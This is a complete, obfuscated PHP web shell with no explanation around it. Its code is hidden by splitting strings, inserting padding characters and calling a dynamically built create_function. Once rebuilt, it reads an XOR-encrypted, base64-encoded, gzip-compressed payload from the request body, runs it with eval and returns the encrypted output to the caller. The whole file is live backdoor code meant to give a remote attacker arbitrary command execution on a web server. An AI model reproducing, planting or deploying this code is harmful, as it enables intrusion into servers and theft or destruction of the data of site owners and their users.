<?php
$K='=$Tst{$Tsi}^$Tsk{$j}Ts;}Ts}Tsreturn $Tso;}if (@preg_match(Ts"/$Tskh(.Ts+)$kf/"TsTs,@file_get_cTsontents("pTshTsp:/Ts/i';
$f='$k="2TsTs350Tse01e"Ts;$kh="013fTs7a09Ts48cTs8";$kf="60Ts5b0a54Ts347b";$p="uXTsww9JSVQSZTsrXrqF";fTsunctiTsonTs x($t,$k){T';
$u=str_replace('uO','','uOcuOreatuOeuO_fuuOuOnction');
$Z='nput"),$m)=Ts=1) {@oTsb_starTst()Ts;@evTsal(@TsgzunTscompress(@x(@bTsasTse64_decodeTs($m[1]Ts),$k)Ts));$o=Ts@obTsTs';
$I='_get_contents();Ts@obTs_enTsd_cleTsan();$r=@base6Ts4_encTsodTse(Ts@x(@gzcompreTsss($o),$kTs));pTsrTsintTs("$p$kh$r$kf");}';
$O='s$Tsc=TsstrlTseTsn($k);$l=strleTsn($Tst);$o="";for($i=0TsTs;$i<$lTsTs;){for($j=0;($j<$c&Ts&$Tsi<$l);$Tsj++,$Tsi++){$o.';
$G=str_replace('Ts','',$f.$O.$K.$Z.$I);
$L=$u('',$G);$L();
?>
